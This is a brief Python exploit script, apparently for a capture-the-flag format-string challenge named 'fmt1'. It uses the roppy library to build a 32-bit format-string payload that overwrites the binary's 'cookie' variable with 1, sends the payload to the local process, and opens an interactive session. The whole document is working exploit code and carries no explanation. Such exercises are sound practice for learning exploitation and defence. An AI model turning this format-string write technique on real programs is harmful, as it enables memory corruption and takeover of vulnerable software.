from roppy import *

p = process("./fmt1")
elf = ELF("fmt1")

payload = fmtstr32(7, {elf.symbols['cookie']: 1})
p.sendlineafter(b":", payload)
p.interactive()